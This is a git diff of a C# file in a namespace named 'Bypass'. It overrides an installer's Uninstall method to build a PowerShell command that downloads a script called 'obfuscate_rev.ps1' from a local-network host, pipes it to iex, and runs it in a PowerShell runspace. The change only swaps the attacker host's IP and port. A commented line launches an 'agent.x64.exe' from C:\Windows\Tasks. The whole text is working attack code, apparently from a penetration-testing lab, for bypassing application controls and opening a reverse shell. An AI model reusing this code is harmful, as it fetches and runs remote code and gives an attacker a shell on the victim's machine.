@@ -17,7 +17,7 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.45.196:8000/payloads/shells/obfuscate_rev.ps1') | iex";
+            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.45.1:80/payloads/shells/obfuscate_rev.ps1') | iex";
             //'Start-Process -FilePath "C:\Windows\Tasks\agent.x64.exe" -NoNewWindow'
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
